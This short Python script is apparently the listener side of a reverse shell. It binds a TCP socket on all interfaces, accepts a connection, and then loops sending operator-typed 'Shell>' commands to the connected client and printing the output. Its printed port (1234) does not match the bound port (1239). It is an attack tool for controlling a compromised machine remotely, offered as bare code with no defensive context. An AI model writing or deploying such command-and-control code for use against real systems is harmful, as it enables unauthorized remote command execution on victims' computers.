#!/usr/bin/env python3
import socket

new_socket = socket.socket()

new_socket.bind(("0.0.0.0", 1239))

print("Listening....0.0.0.0:1234")

new_socket.listen(4)

while True:
    client, addr = new_socket.accept()
    #client.send(b"ls")
    print(addr[0],addr[1])
    while True:
        command = input("Shell> ").strip()
        client.send(command.encode())
        output= client.recv(1024).decode()
        print(output)